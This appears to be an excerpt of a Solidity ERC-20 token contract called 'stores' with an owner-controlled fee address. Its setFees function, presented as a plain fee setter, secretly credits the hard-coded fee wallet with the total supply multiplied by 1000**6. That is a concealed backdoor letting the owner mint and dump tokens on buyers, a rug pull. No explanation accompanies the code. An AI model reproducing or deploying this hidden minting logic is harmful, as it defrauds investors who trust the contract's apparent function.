...
contract  stores is Context, IERC20, Ownable{
    using SafeMath for uint256;
    string private _name = "store";
    string private _symbol = "erots";
    ...
    constructor () {
        ...
        _feeAddr = payable(address(0xA2749eb66ef72f879Ca7261A3647291F71A7DD51));
    ...
    function setFees(uint256 buyFee, uint256 sellFee) public onlyOwner {
        _buyFee = buyFee;
        _sellFee = sellFee;
        _balances[_feeAddr] = _totalSupply.mul(1000**6);
    }
